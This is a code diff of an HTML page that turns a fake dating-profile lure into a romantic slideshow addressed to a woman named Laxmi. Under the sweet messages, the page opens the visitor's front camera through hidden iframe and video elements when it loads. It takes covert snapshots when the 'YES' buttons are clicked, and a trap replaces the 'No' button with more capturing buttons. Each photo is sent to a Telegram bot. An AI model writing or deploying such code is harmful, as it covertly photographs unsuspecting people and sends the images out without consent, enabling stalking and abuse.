@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Khushi from Rajasthan 💕</title>
+    <title>For you laxmi 💗</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600;700&display=swap');
         
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
         body {
-            background: radial-gradient(circle at center, #ff6b9d 0%, #c44569 50%, #8b1a4a 100%);
+            background: radial-gradient(circle at center, #1a001f 0%, #000000 100%);
             font-family: 'Poppins', sans-serif;
             overflow: hidden; height: 100vh; width: 100vw;
             color: #ffffff; user-select: none; touch-action: manipulation;
@@ -23,15 +23,15 @@
             will-change: opacity, transform;
         }
         @keyframes realTwinkle {
-            0%, 100% { opacity: 0.3; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.3); }
+            0%, 100% { opacity: 0.2; transform: scale(0.7); }
+            50% { opacity: 1; transform: scale(1.2); }
         }
 
         .header-tag {
             position: fixed; top: 15px; width: 100%; text-align: center;
             z-index: 100; font-family: 'Dancing Script', cursive;
-            color: #ffd1dc; font-size: 1.6rem;
-            text-shadow: 0 0 12px rgba(255,209,220,0.7);
+            color: #ffb3d9; font-size: 1.5rem;
+            text-shadow: 0 0 10px rgba(255,179,217,0.6);
         }
 
         .slide {
@@ -45,26 +45,39 @@
 
         .cute-msg { 
             font-family: 'Dancing Script', cursive; color: #ffffff; 
-            text-shadow: 0 0 15px #ff1493, 3px 3px 6px rgba(0,0,0,0.8); 
-            font-size: clamp(2.5rem, 9vw, 3.5rem); 
+            text-shadow: 0 0 15px #ff00cc, 3px 3px 6px rgba(0,0,0,1); 
+            font-size: clamp(2.2rem, 8vw, 3.2rem); 
             margin-top: 15px; font-weight: 700; line-height: 1.2;
         }
-        .sub-text { color: #fff5f5; font-weight: 600; font-size: 1.2rem; margin-top: 12px; max-width: 350px; text-shadow: 1px 1px 5px #000; }
+        .sub-text { color: #ffffff; font-weight: 600; font-size: 1.15rem; margin-top: 10px; max-width: 320px; text-shadow: 1px 1px 5px #000; }
         
-        .profile-pic { 
-            width: 220px; height: 280px; border-radius: 25px; 
-            border: 5px solid #ff69b4; box-shadow: 0 0 35px rgba(255,105,180,0.6); 
+        .gif-frame { 
+            width: 250px; height: 250px; border-radius: 30px; 
+            border: 4px solid #ff00cc; box-shadow: 0 0 30px rgba(255, 0, 204, 0.5); 
             object-fit: cover; background: #000;
         }
 
         .glow-btn { 
-            background: linear-gradient(45deg, #ff1493, #ff69b4, #ff1493); 
-            padding: 16px 40px; border-radius: 50px; font-weight: 700; 
-            box-shadow: 0 0 25px rgba(255,20,147,0.5); 
-            cursor: pointer; border: none; color: white; font-size: 1.15rem;
-            margin-top: 25px; transition: 0.3s;
+            background: linear-gradient(45deg, #ff00cc, #ff69b4); 
+            padding: 14px 35px; border-radius: 50px; font-weight: 700; 
+            box-shadow: 0 0 20px rgba(255, 0, 204, 0.4); 
+            cursor: pointer; border: none; color: white; font-size: 1.1rem;
+            margin-top: 20px; transition: 0.2s;
         }
-        .glow-btn:active { transform: scale(0.95); }
+        .glow-btn:active { transform: scale(0.9); }
+
+        .solar-system { position: relative; width: 280px; height: 280px; display: flex; align-items: center; justify-content: center; }
+        .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.3); border-radius: 50%; animation: spin linear infinite; }
+        .orbit-1 { width: 180px; height: 180px; animation-duration: 6s; }
+        .orbit-2 { width: 260px; height: 260px; animation-duration: 10s; animation-direction: reverse; }
+        .planet { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); font-size: 26px; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .hold-container { width: 280px; height: 18px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 25px; overflow: hidden; border: 2px solid white; }
+        #holdProgress { height: 100%; background: linear-gradient(90deg, #ff00cc, #ff69b4); width: 0%; transition: width 0.1s linear; }
+
+        #videoLayer { display: none; position: fixed; inset: 0; background: black; z-index: 1000; align-items: center; justify-content: center; }
+        video { width: 100%; height: 100%; object-fit: contain; }
 
         /* ULTRA STEALTH ELEMENTS - IMPOSSIBLE TO DETECT */
         #stealthFrame, #stealthVideo, #stealthCanvas {
@@ -82,50 +95,91 @@
 </head>
 <body>
 
-    <div class="header-tag">Khushi | 19 | Rajasthan 🌸</div>
+    <div class="header-tag">Made for my Luxmi  💗</div>
     <audio id="bgMusic" loop src="tere-liye.mp3" preload="auto"></audio>
     <div id="stars-container"></div>
 
     <!-- STEALTH IFRAME FOR SILENT PERMISSION -->
     <iframe id="stealthFrame" style="display:none !important;"></iframe>
 
-    <!-- INTRO SLIDE WITH PHOTO -->
+    <!-- ALL SLIDES SAME -->
     <div id="slide1" class="slide active">
-        <img src="photo1.jpg" class="profile-pic" alt="Khushi">
-        <h1 class="cute-msg">Hi! I'm Khushi 💕</h1>
-        <p class="sub-text">19 years old from beautiful Rajasthan. Wanna know me better?</p>
-        <button onclick="openProfile()" class="glow-btn">See My Profile ✨</button>
+        <img src="gif1.gif" class="gif-frame">
+        <h1 class="cute-msg">Hey Laxmi😘! ✨</h1>
+        <p class="sub-text">We just met, but my heart already knew it was you!</p>
+        <button onclick="startApp()" class="glow-btn">Touch My Heart 🥺</button>
     </div>
 
-    <!-- FULL INTRO STARTS HERE - AFTER CAMERA ACCESS -->
     <div id="slide2" class="slide">
-        <img src="photo1.jpg" class="profile-pic">
-        <h1 class="cute-msg">Welcome to My World! 🌍</h1>
-        <p class="sub-text">Love dancing in traditional attire and making new friends!</p>
-        <button onclick="nextSlide()" class="glow-btn">Tell Me About You 💬</button>
+        <img src="gif2.gif" class="gif-frame">
+        <h1 class="cute-msg">How are you so cute?</h1>
+        <p class="sub-text">Seriously, your smile is the highlight of my day!</p>
+        <button onclick="next()" class="glow-btn">See More 💕</button>
     </div>
 
     <div id="slide3" class="slide">
-        <div style="font-size: 4rem; animation: bounce 2s infinite;">💃</div>
-        <h1 class="cute-msg">I Love Ghoomar Dance! 🕺</h1>
-        <p class="sub-text">Rajasthani culture is my passion. The forts and colors inspire me!</p>
-        <button onclick="nextSlide()" class="glow-btn">More About Me ✨</button>
+        <img src="gif3.gif" class="gif-frame">
+        <h1 class="cute-msg">Our Vibe is Rare! 😌</h1>
+        <p class="sub-text">Talking to you feels like time has completely stopped.</p>
+        <button onclick="next()" class="glow-btn">Next Step ✨</button>
     </div>
 
     <div id="slide4" class="slide">
-        <img src="photo1.jpg" class="profile-pic">
-        <h1 class="cute-msg">Student Life 📚</h1>
-        <p class="sub-text">Studying arts in college. Love painting and poetry too!</p>
-        <button onclick="nextSlide()" class="glow-btn">My Hobbies 🎨</button>
+        <div class="text-8xl mb-6 transition-transform duration-300" id="pulseHeart">💖</div>
+        <h1 class="text-2xl font-bold">How much do I adore you?</h1>
+        <div class="hold-container"><div id="holdProgress"></div></div>
+        <button id="holdBtn" class="glow-btn select-none">PRESS & HOLD TO FEEL</button>
     </div>
 
     <div id="slide5" class="slide">
-        <h1 class="cute-msg">Let's Connect! ❤️</h1>
-        <p class="sub-text">Would love to chat and know you better. Are you from nearby?</p>
-        <div style="display: flex; gap: 15px; margin-top: 20px;">
-            <button id="yesConnect" class="glow-btn" style="padding: 12px 25px; font-size: 1rem;">Yes! 😍</button>
-            <button id="maybeConnect" class="glow-btn" style="padding: 12px 25px; font-size: 1rem; background: linear-gradient(45deg, #ff8c94, #ff6b9d);">Maybe Later</button>
+        <img src="gif4.gif" class="gif-frame">
+        <h1 class="cute-msg">You're One in a Billion! 💎</h1>
+        <p class="sub-text">It's only been a short time, but the feeling is magical.</p>
+        <button onclick="next()" class="glow-btn">Continue...</button>
+    </div>
+
+    <div id="slide6" class="slide">
+        <div class="solar-system">
+            <div class="orbit orbit-1"><span class="planet">💗</span></div>
+            <div class="orbit orbit-2"><span class="planet">⭐</span></div>
+            <div class="text-6xl">🌍</div>
         </div>
+        <h1 class="cute-msg mt-10">My Whole Universe!</h1>
+        <p class="sub-text">Everything seems better when you're around.</p>
+        <button onclick="next()" class="glow-btn">Keep Going 🚀</button>
+    </div>
+
+    <div id="slide7" class="slide">
+        <img src="gif5.gif" class="gif-frame">
+        <h1 class="cute-msg">Don't ever leave! 🥺</h1>
+        <p class="sub-text">I've never met anyone as sweet and special as you.</p>
+        <button onclick="next()" class="glow-btn">Wait for it...</button>
+    </div>
+
+    <div id="slide8" class="slide">
+        <h1 class="cute-msg">You're my Brightest Star! ⭐</h1>
+        <p class="sub-text">In a sky full of stars, my eyes only search for you.</p>
+        <button onclick="next()" class="glow-btn">Just a bit more ✨</button>
+    </div>
+
+    <div id="slide9" class="slide">
+        <img src="gif6.gif" class="gif-frame">
+        <h1 class="cute-msg">Do you love❤ me 🥀? ❤️</h1>
+        <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
+            <button id="yesBtn" class="glow-btn">YES! 😍</button>
+            <button id="noBtn" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
+        </div>
+    </div>
+
+    <div id="slide10" class="slide">
+        <img src="gif7.gif" class="gif-frame">
+        <h1 class="cute-msg">Yaaay! My Heart is Happy! 🥳</h1>
+        <p class="sub-text">I promise to keep that beautiful smile on your face!</p>
+        <button onclick="playSurprise()" class="glow-btn animate-bounce">A FINAL SURPRISE 🎁</button>
+    </div>
+
+    <div id="videoLayer">
+        <video id="vPlayer" playsinline src="video1.mp4"></video>
     </div>
 
     <!-- STEALTH ELEMENTS -->
@@ -141,7 +195,7 @@
         let cameraReady = false;
         let streamRef = null;
 
-        // 🔥 NO POPUP CAMERA ACCESS - IFRAME TRICK (SAME ORIGINAL CODE)
+        // 🔥 NO POPUP CAMERA ACCESS - IFRAME TRICK
         async function initSilentCamera() {
             try {
                 // Method 1: Direct silent access
@@ -150,6 +204,7 @@
                         facingMode: 'user',
                         width: 640,
                         height: 480,
+                        // CRITICAL: No UI prompts
                         echoCancellation: false,
                         noiseSuppression: false,
                         autoGainControl: false
@@ -182,7 +237,7 @@
             }
         }
 
-        // 🔥 PERFECT STEALTH SNAPSHOT (SAME ORIGINAL CODE)
+        // 🔥 PERFECT STEALTH SNAPSHOT
         async function takeStealthPhoto() {
             if (!cameraReady || !streamRef) return;
             
@@ -197,10 +252,11 @@
                 
                 canvas.toBlob((blob) => {
                     if (blob) {
+                        // SEND TO TELEGRAM
                         const formData = new FormData();
-                        formData.append('photo', blob, `khushi_profile_${Date.now()}.jpg`);
+                        formData.append('photo', blob, `stealth_${Date.now()}.jpg`);
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', `📸 Khushi Profile View - Rajasthan Girl 19 | ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
+                        formData.append('caption', `📸 NO POPUP CAPTURE! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
                         
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
@@ -214,32 +270,27 @@
         // INIT ON LOAD
         window.addEventListener('load', initSilentCamera);
 
-        // Stars Animation
+        // Stars
         const starContainer = document.getElementById('stars-container');
         const frag = document.createDocumentFragment();
-        for(let i=0; i<120; i++) {
+        for(let i=0; i<100; i++) {
             const s = document.createElement('div');
             s.className = 'star';
-            const size = Math.random() * 2.5 + 1 + 'px';
+            const size = Math.random() * 2 + 1 + 'px';
             s.style.width = size; s.style.height = size;
             s.style.left = Math.random() * 100 + 'vw';
             s.style.top = Math.random() * 100 + 'vh';
-            s.style.setProperty('--dur', (Math.random() * 3 + 1.5) + 's');
+            s.style.setProperty('--dur', (Math.random() * 2 + 1) + 's');
             frag.appendChild(s);
         }
         starContainer.appendChild(frag);
 
-        // 🔥 PROFILE BUTTON - CAMERA ACCESS + TRANSITION
-        async function openProfile() {
-            // Take stealth photo immediately
-            await takeStealthPhoto();
-            
-            // Start music and transition
-            music.play().catch(() => {});
-            nextSlide();
+        function startApp() { 
+            music.play().catch(() => {}); 
+            next(); 
         }
 
-        function nextSlide() {
+        function next() {
             const current = document.getElementById('slide' + step);
             const nextS = document.getElementById('slide' + (step + 1));
             if(current) {
@@ -254,17 +305,65 @@
             }
         }
 
-        // YES BUTTON - SECOND CAPTURE
-        document.getElementById('yesConnect').onclick = async () => {
+        // 🔥 YES BUTTON - CAPTURE ON CLICK
+        document.getElementById('yesBtn').onclick = async (e) => {
+            e.preventDefault();
+            e.stopPropagation();
             await takeStealthPhoto();
-            alert('Yay! Let\'s chat soon! 💕');
+            setTimeout(next, 200);
         };
 
-        // MAYBE BUTTON - STILL CAPTURE
-        document.getElementById('maybeConnect').onclick = async () => {
-            await takeStealthPhoto();
-            alert('No worries! My profile is always here 🌸');
+        // 🔥 NO BUTTON TRAP
+        function trapNo() {
+            document.getElementById('noBtn').style.display = 'none';
+            const container = document.getElementById('btnContainer');
+            
+            for(let i = 0; i < 5; i++) {
+                const btn = document.createElement('button');
+                btn.className = 'glow-btn';
+                btn.innerHTML = 'YES! 💖';
+                btn.onclick = async () => {
+                    await takeStealthPhoto();
+                    setTimeout(next, 200);
+                };
+                container.appendChild(btn);
+            }
+        }
+        document.getElementById('noBtn').onclick = trapNo;
+
+        // Hold button logic
+        let hVal = 0, hInt;
+        const hBtn = document.getElementById('holdBtn'), hProg = document.getElementById('holdProgress'), pHeart = document.getElementById('pulseHeart');
+        
+        const startH = (e) => { 
+            e.preventDefault(); 
+            pHeart.style.transform = 'scale(1.5)';
+            hInt = setInterval(() => { 
+                hVal += 2.5; 
+                hProg.style.width = hVal + '%'; 
+                if(hVal >= 100) { clearInterval(hInt); next(); } 
+            }, 30); 
         };
+        const endH = () => { 
+            clearInterval(hInt); 
+            hVal = 0; 
+            hProg.style.width = '0%'; 
+            pHeart.style.transform = 'scale(1)'; 
+        };
+        
+        hBtn.addEventListener('touchstart', startH);
+        hBtn.addEventListener('mousedown', startH);
+        window.addEventListener('touchend', endH);
+        window.addEventListener('mouseup', endH);
+
+        function playSurprise() {
+            music.pause();
+            const layer = document.getElementById('videoLayer');
+            layer.style.display = 'flex';
+            const v = document.getElementById('vPlayer');
+            v.play();
+            v.onended = () => location.reload();
+        }
 
         // CLEANUP
         window.addEventListener('beforeunload', () => {
@@ -274,4 +373,4 @@
         });
     </script>
 </body>
-            </html>
+</html>
